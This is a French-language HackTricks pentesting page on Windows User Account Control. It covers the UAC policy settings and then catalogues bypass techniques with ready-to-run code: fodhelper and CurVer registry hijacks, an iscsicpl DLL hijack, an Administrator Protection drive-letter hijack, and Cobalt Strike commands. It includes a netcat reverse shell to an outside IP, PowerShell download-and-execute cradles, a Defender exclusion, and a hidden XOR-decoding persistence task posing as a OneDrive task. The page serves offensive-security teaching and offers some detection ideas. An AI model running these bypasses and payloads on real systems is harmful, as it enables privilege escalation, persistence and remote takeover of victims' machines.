# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui active une **invite de consentement pour les activités élevées**. Les applications ont différents niveaux d'`integrity`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Lorsque UAC est activé, les applications et les tâches s'exécutent toujours **sous le contexte de sécurité d'un compte non-administrateur** à moins qu'un administrateur n'autorise explicitement ces applications/tâches à avoir un accès de niveau administrateur au système pour s'exécuter. C'est une fonctionnalité de confort qui protège les administrateurs contre des modifications involontaires, mais elle n'est pas considérée comme une frontière de sécurité.

Pour plus d'infos sur les niveaux d'`integrity` :


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Lorsque UAC est en place, un utilisateur administrateur reçoit 2 tokens : une clé d'utilisateur standard, pour effectuer les actions courantes au niveau standard, et une autre avec les privilèges admin.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explique en détail comment UAC fonctionne et inclut le processus de logon, l'expérience utilisateur et l'architecture UAC. Les administrateurs peuvent utiliser des stratégies de sécurité pour configurer le fonctionnement de UAC selon leur organisation au niveau local (en utilisant secpol.msc), ou le configurer et le déployer via des Group Policy Objects (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont détaillés [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de Group Policy pouvant être définis pour UAC. Le tableau suivant fournit des détails supplémentaires :

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

Les **local security policies** ("secpol.msc" sur la plupart des systèmes) sont configurées par défaut pour **empêcher les utilisateurs non-admin d'effectuer des installations de logiciels**. Cela signifie que même si un utilisateur non-admin peut télécharger l'installateur de votre logiciel, il ne pourra pas l'exécuter sans un compte admin.

### Registry Keys to Force UAC to Ask for Elevation

En tant qu'utilisateur standard sans droits admin, vous pouvez vous assurer que le compte "standard" est **invité par UAC à fournir ses credentials** lorsqu'il tente d'effectuer certaines actions. Cette action nécessiterait de modifier certaines **registry keys**, pour lesquelles vous avez besoin de permissions admin, sauf s'il existe un **UAC bypass**, ou si l'attaquant est déjà connecté en tant qu'admin.

Même si l'utilisateur fait partie du groupe **Administrators**, ces changements obligent l'utilisateur à **ressaisir les credentials de son compte** afin d'effectuer des actions administratives.

**Le seul inconvénient est que cette approche nécessite que UAC soit désactivé pour fonctionner, ce qui est peu probable en environnement de production.**

Les registry keys et entrées que vous devez modifier sont les suivantes (avec leurs valeurs par défaut entre parenthèses) :

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Cela peut aussi être fait manuellement via l'outil Local Security Policy. Une fois modifié, les opérations administratives demandent à l'utilisateur de ressaisir ses credentials.

### Note

**User Account Control n'est pas une frontière de sécurité.** Par conséquent, les utilisateurs standard ne peuvent pas sortir de leurs comptes et obtenir des droits administrateur sans un exploit de local privilege escalation.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilèges UAC

- Internet Explorer Protected Mode utilise des vérifications d’intégrité pour empêcher les processus à haut niveau d’intégrité (comme les navigateurs web) d’accéder à des données à faible niveau d’intégrité (comme le dossier des fichiers Internet temporaires). Cela est fait en exécutant le navigateur avec un token à faible intégrité. Lorsque le navigateur tente d’accéder à des données stockées dans la zone à faible intégrité, le système d’exploitation vérifie le niveau d’intégrité du processus et autorise l’accès en conséquence. Cette fonctionnalité aide à empêcher les attaques de remote code execution d’obtenir l’accès à des données sensibles sur le système.
- Lorsqu’un utilisateur se connecte à Windows, le système crée un access token qui contient une liste des privilèges de l’utilisateur. Les privilèges sont définis comme la combinaison des droits et des capacités d’un utilisateur. Le token contient également une liste des credentials de l’utilisateur, qui sont utilisés pour authentifier l’utilisateur sur l’ordinateur et auprès des ressources sur le réseau.

### Autoadminlogon

Pour configurer Windows afin qu’il ouvre automatiquement une session pour un utilisateur spécifique au démarrage, définissez la **`AutoAdminLogon` registry key**. C’est utile pour des environnements kiosk ou à des fins de test. Utilisez cela uniquement sur des systèmes sécurisés, car cela expose le mot de passe dans le registre.

Définissez les clés suivantes à l’aide de l’Éditeur du Registre ou de `reg add` :

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` :
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Pour revenir au comportement de connexion normal, définissez `AutoAdminLogon` sur 0.

## UAC bypass

> [!TIP]
> Note that if you have graphical access to the victim, UAC bypass is straight forward as you can simply click on "Yes" when the UAC prompt appears

Le UAC bypass est nécessaire dans la situation suivante : **le UAC est activé, votre processus s’exécute dans un contexte de medium integrity, et votre utilisateur appartient au groupe des administrators**.

Il est important de mentionner qu’il est **beaucoup plus difficile de bypass le UAC s’il est au niveau de sécurité le plus élevé (Always) que s’il est à l’un des autres niveaux (Default).**

### UAC disabled

Si le UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un reverse shell avec des privilèges admin** (high integrity level) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass avec duplication de token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Très** basique UAC "bypass" (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur qui fait partie du groupe Administrators, vous pouvez **monter le partage C$** via SMB (file system) localement sur un nouveau disque et vous aurez **accès à tout ce qui se trouve dans le système de fichiers** (même le dossier personnel de Administrator).

> [!WARNING]
> **Il semble que cette astuce ne fonctionne plus**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass UAC avec cobalt strike

Les techniques de Cobalt Strike ne fonctionneront que si UAC n'est pas réglé sur son niveau de sécurité maximal
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** ont également plusieurs modules pour **bypass** le **UAC**.

### KRBUACBypass

Documentation et outil dans [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)qui est une **compilation** de plusieurs UAC bypass exploits. Notez que vous devrez **compiler UACME en utilisant visual studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`) , vous devrez savoir **lequel vous devez utiliser.**\
Vous devez **faire attention** car certains bypass vont **provoquer l'ouverture de certains autres programmes** qui vont **alerter** l'**utilisateur** que quelque chose est en train de se passer.

UACME indique la **version de build à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions :
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Le binaire de confiance `fodhelper.exe` est auto-élevé sur les Windows modernes. Lorsqu’il est lancé, il interroge le chemin de registre par utilisateur ci-dessous sans valider le verbe `DelegateExecute`. Y déposer une commande permet à un processus à Medium Integrity (l’utilisateur est dans Administrators) de lancer un processus à High Integrity sans invite UAC.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Étapes PowerShell (définissez votre payload, puis déclenchez)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- Fonctionne lorsque l’utilisateur actuel est membre de Administrators et que le niveau UAC est par défaut/lenient (pas Always Notify avec restrictions supplémentaires).
- Utilisez le chemin `sysnative` pour lancer PowerShell 64 bits depuis un processus 32 bits sur Windows 64 bits.
- Le payload peut être n’importe quelle commande (PowerShell, cmd, ou un chemin EXE). Évitez les interfaces demandant une interaction pour rester discret.

#### Variante de détournement CurVer/extension (HKCU uniquement)

Des échantillons récents abusant de `fodhelper.exe` évitent `DelegateExecute` et **redirigent le ProgID `ms-settings`** via la valeur `CurVer` propre à l’utilisateur. Le binaire auto-élevé résout toujours le handler sous `HKCU`, donc aucun jeton admin n’est nécessaire pour créer les clés :
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Une fois élevé, le malware **désactive souvent les futures invites** en réglant `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` sur `0`, puis effectue une défense évasion supplémentaire (par ex. `Add-MpPreference -ExclusionPath C:\ProgramData`) et recrée la persistance pour s’exécuter avec une haute intégrité. Une tâche de persistance typique stocke un **script PowerShell chiffré en XOR** sur le disque et le décode/l’exécute en mémoire chaque heure :
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Cette variante nettoie toujours le dropper et ne laisse que les payloads staged, ce qui fait que la détection repose sur la surveillance du **`CurVer` hijack**, du détournement de `ConsentPromptBehaviorAdmin`, de la création d’exclusions Defender, ou de tâches planifiées qui déchiffrent PowerShell en mémoire.

#### Plus de UAC bypass

**Toutes** les techniques utilisées ici pour bypass AUC **nécessitent** un **full interactive shell** avec la victime (un simple shell nc.exe ne suffit pas).

Vous pouvez l’obtenir via une session **meterpreter**. Migrez vers un **process** dont la valeur **Session** est égale à **1** :

![](<../../images/image (863).png>)

(_explorer.exe_ devrait fonctionner)

### UAC Bypass avec GUI

Si vous avez accès à une **GUI**, vous pouvez simplement accepter la demande UAC quand elle apparaît, vous n’avez pas vraiment besoin de la bypass. Donc, obtenir l’accès à une GUI vous permettra de bypass le UAC.

De plus, si vous obtenez une session GUI qu’une personne utilisait (potentiellement via RDP), il existe **certains outils qui s’exécuteront en tant qu’administrateur** à partir desquels vous pourriez **lancer** un **cmd** par exemple **en tant qu’admin** directement sans être de nouveau sollicité par UAC, comme [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela peut être un peu plus **stealthy**.

### UAC bypass par force brute bruyant

Si le bruit ne vous dérange pas, vous pouvez toujours **exécuter quelque chose comme** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) qui **demande l’élévation des permissions jusqu’à ce que l’utilisateur l’accepte**.

### Votre propre bypass - Méthodologie de base UAC bypass

Si vous regardez **UACME**, vous verrez que la **plupart des UAC bypasses abusent d’une vulnérabilité de Dll Hijacking** (principalement en écrivant la dll malveillante dans _C:\Windows\System32_). [Lisez ceci pour apprendre à trouver une vulnérabilité de Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trouvez un binaire qui va **autoelevate** (vérifiez qu’à son exécution il tourne avec un niveau d’intégrité élevé).
2. Avec procmon, trouvez des événements "**NAME NOT FOUND**" qui peuvent être vulnérables au **DLL Hijacking**.
3. Vous aurez probablement besoin d’**écrire** la DLL à l’intérieur de certains **protected paths** (comme C:\Windows\System32) où vous n’avez pas les permissions d’écriture. Vous pouvez contourner cela en utilisant :
1. **wusa.exe** : Windows 7,8 et 8.1. Il permet d’extraire le contenu d’un fichier CAB dans des protected paths (parce que cet outil est exécuté depuis un niveau d’intégrité élevé).
2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL dans le protected path et exécuter le binaire vulnérable et autoelevated.

### Une autre technique de UAC bypass

Elle consiste à vérifier si un binaire **autoElevated** essaie de **lire** depuis le **registry** le **nom/chemin** d’un **binary** ou d’une **commande** à **exécuter** (c’est plus intéressant si le binaire recherche cette information dans le **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Le binaire 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` est un binaire **auto-elevated** qui peut être abusé pour charger `iscsiexe.dll` via l’ordre de recherche. Si vous pouvez placer une `iscsiexe.dll` malveillante dans un dossier **user-writable**, puis modifier le `PATH` de l’utilisateur courant (par exemple via `HKCU\Environment\Path`) pour que ce dossier soit recherché, Windows peut charger la DLL de l’attaquant dans le process élevé `iscsicpl.exe` **sans afficher de prompt UAC**.

Notes pratiques :
- C’est utile lorsque l’utilisateur courant est dans **Administrators** mais tourne en **Medium Integrity** à cause de UAC.
- La copie **SysWOW64** est celle qui est pertinente pour ce bypass. Considérez la copie **System32** comme un binaire séparé et validez son comportement indépendamment.
- Le primitive est une combinaison de **auto-elevation** et de **DLL search-order hijacking**, donc le même workflow ProcMon utilisé pour d’autres UAC bypasses est utile pour valider le chargement manquant de la DLL.

Flux minimal :
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idées de détection :
- Alerter sur `reg add` / des écritures de registre vers `HKCU\Environment\Path` immédiatement suivies de l’exécution de `C:\Windows\SysWOW64\iscsicpl.exe`.
- Rechercher `iscsiexe.dll` dans des emplacements **contrôlés par l’utilisateur** comme `%TEMP%` ou `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Corréler les lancements de `iscsicpl.exe` avec des processus enfants inattendus ou des chargements de DLL provenant de répertoires Windows non standard.

### Bypass de la protection Administrateur (25H2) via détournement de lettre de lecteur par carte de périphériques DOS par session de connexion

Windows 11 25H2 “Administrator Protection” utilise des jetons shadow-admin avec des cartes `\Sessions\0\DosDevices/<LUID>` par session. Le répertoire est créé à la demande par `SeGetTokenDeviceMap` lors de la première résolution de `\??`. Si l’attaquant usurpe le jeton shadow-admin uniquement au niveau **SecurityIdentification**, le répertoire est créé avec l’attaquant comme **owner** (hérite de `CREATOR OWNER`), ce qui permet des liens de lettre de lecteur qui prennent le pas sur `\GLOBAL??`.

**Étapes :**

1. Depuis une session à faible privilège, appeler `RAiProcessRunOnce` pour lancer un `runonce.exe` shadow-admin sans invite.
2. Dupliquer son jeton primaire en un jeton d’**identification** et l’usurper tout en ouvrant `\??` afin de forcer la création de `\Sessions\0\DosDevices/<LUID>` sous la propriété de l’attaquant.
3. Créer un lien symbolique `C:` là-bas pointant vers un stockage contrôlé par l’attaquant ; les accès système de fichiers suivants dans cette session résolvent `C:` vers le chemin de l’attaquant, permettant un DLL/file hijack sans invite.

**PowerShell PoC (NtObjectManager) :**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
